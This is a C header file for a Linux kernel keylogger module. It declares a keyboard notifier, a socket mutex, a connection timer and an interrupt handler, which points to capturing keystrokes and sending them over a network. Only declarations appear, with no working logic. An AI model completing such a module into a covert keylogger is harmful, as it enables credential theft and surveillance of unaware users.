#ifndef __KEYBOARDLOGGER_H__
#define __KEYBOARDLOGGER_H__

#define KEY_BUFFER_SIZE 250
#define KEYLOGGER_MSG "Keys pressed: \0"

extern struct notifier_block keyboard_notifier_block;
extern struct mutex socks_mutex;
extern struct timer_list connection_timer;

irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id);

#endif /* __KEYBOARDLOGGER_H__ */